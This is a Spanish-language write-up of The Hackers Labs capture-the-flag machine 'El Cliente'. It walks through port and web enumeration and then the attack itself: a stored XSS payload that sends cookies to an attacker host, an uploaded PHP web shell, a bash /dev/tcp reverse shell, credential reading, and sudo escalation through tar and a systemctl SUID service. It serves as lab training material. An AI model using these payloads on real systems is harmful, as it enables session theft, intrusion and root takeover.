---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Medium
  - HTTP
  - XSS
  - UploadFile
  - ReverseShell
  - PrivilegeEscalation
  - SecurityMisconfigurations
  - SSH
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]]
	- [[#Explotación#Arbitrary File Upload/Reverse Shell|Arbitrary File Upload/Reverse Shell]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Security Misconfigurations|Security Misconfigurations]]
	- [[#Escalada de Privilegios#SSH|SSH]]
	- [[#Escalada de Privilegios#Sudo - Tar|Sudo - Tar]]
	- [[#Escalada de Privilegios#Sudo - Systemctl|Sudo - Systemctl]]

---
# El Cliente

![](Screenshots/el_cliente.png)

> En este write-up se documenta la resolución paso a paso de la máquina **El Cliente** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/32), clasificada como dificultad **Medium**. Durante la explotación se abusa de un **XSS almacenado**, una **subida arbitraria de archivos** y varias **malas configuraciones de seguridad**, lo que permite obtener una **reverse shell**, pivotar entre usuarios y escalar privilegios hasta **root**.

---
## Enumeración
### Ping

`ping -c 1 192.168.1.37`

![](Screenshots/Pasted%20image%2020260101183456.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.37 -oG allPorts`

![](Screenshots/Pasted%20image%2020260101183547.png)

`nmap -p22,80 -sCV 192.168.1.37 -oN targeted`

![](Screenshots/Pasted%20image%2020260101183610.png)
### HTTP

`http://192.168.1.37/`

![](Screenshots/Pasted%20image%2020260101183743.png)

Se observa el código fuente.

![](Screenshots/Pasted%20image%2020260101183852.png)

Se añade al `/etc/hosts`: `echo "192.168.1.37 arka.thl" >> /etc/hosts`.
### Fuzzing Web

`gobuster dir -u http://arka.thl/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020260101190754.png)

`wfuzz -c --hl=190 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.arka.thl" -u 192.168.1.37`

![](Screenshots/Pasted%20image%2020260101190927.png)

Se descubre dos subdominios:
- `admin`.
- `www.admin`.

Se añaden al `/etc/hosts`: `echo "192.168.1.37 admin.arka.thl www.admin.arka.thl" >> /etc/hosts`.

`http://admin.arka.thl/login.php`

![](Screenshots/Pasted%20image%2020260101191244.png)

Se encuentran un inicio de sesión.

`gobuster dir -u http://admin.arka.thl -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020260101195910.png)

---
## Explotación
### Cross-Site Scripting (XSS)

`http://arka.thl/contact.php`

![](Screenshots/Pasted%20image%2020260101184718.png)

Se observa un formulario de contacto. Se rellena todos los datos y en el mensaje, se añade lo siguiente:

```HTML
<img src="" onerror="fetch(`http://[IP_MÁQUINA_ATACANTE]/?cookie=${document.cookie}`);" />
```

Antes de enviar, nos ponemos en escucha: `nc -nlvp 80`.

![](Screenshots/Pasted%20image%2020260101191213.png)

Se accede al inicio de sesión: `http://admin.arka.thl/login.php`.

Con la extensión `Cookie-Editor` se cambia con la *Cookie* obtenida anteriormente.

![](Screenshots/Pasted%20image%2020260101191621.png)

Se recarga la página.

![](Screenshots/Pasted%20image%2020260101191809.png)

Se accede a `Proyectos`.

![](Screenshots/Pasted%20image%2020260101191949.png)
### Arbitrary File Upload/Reverse Shell

Se crea una *shell* llamada `shell.phar`.

```Shell
<?php
$output = shell_exec($_GET["cmd"]);
echo "<pre>$output</pre>";
?>
```

Se sube en `Proyectos`.

![](Screenshots/Pasted%20image%2020260101192649.png)

Se accede a la *shell*.

`http://admin.arka.thl/uploads/6956bbd8e3ded_shell.phar?cmd=id`

![](Screenshots/Pasted%20image%2020260101192734.png)

Nos ponemos en escucha: `nc -nlvp 1235`.

`http://admin.arka.thl/uploads/6956bbd8e3ded_shell.phar?cmd=bash -c "bash -i>%26 /dev/tcp/[IP_MÁQUINA_ATACANTE]/1235 0>%261"`

Se obtiene la *Reverse Shell*.

![](Screenshots/Pasted%20image%2020260101193132.png)

Se visualiza el `/etc/passwd`.

![](Screenshots/Pasted%20image%2020260101193256.png)

Se encuentran los usuarios:
- `kobe`.
- `scott`.

---
## Escalada de Privilegios
### Security Misconfigurations

Se accede al directorio `/var/www/html/admin.arka.thl` y se visualiza el archivo `db.php`.

![](Screenshots/Pasted%20image%2020260101193636.png)
### SSH

`ssh scott@192.168.1.37`

![](Screenshots/Pasted%20image%2020260101193840.png)
### Sudo - Tar

`sudo -l`

![](Screenshots/Pasted%20image%2020260101193943.png)

[GTFOBins - Tar](https://gtfobins.github.io/gtfobins/tar/#sudo)

`sudo -u kobe /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`

`whoami`

![](Screenshots/Pasted%20image%2020260101194159.png)

Se encuentra la *flag de usuario*: `/home/kobe/user.txt`.
### Sudo - Systemctl

`sudo -l`

![](Screenshots/Pasted%20image%2020260101194412.png)

[GTFOBins - Systemctl](https://gtfobins.github.io/gtfobins/systemctl/#sudo).

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > evil.service
sudo systemctl link /home/kobe/evil.service
sudo systemctl enable --now /home/kobe/evil.service
bash -p
```

![](Screenshots/Pasted%20image%2020260101194931.png)

Se encuentra la *flag de root*: `/root/root.txt`.

---

[El Cliente](https://labs.thehackerslabs.com/machine/32).
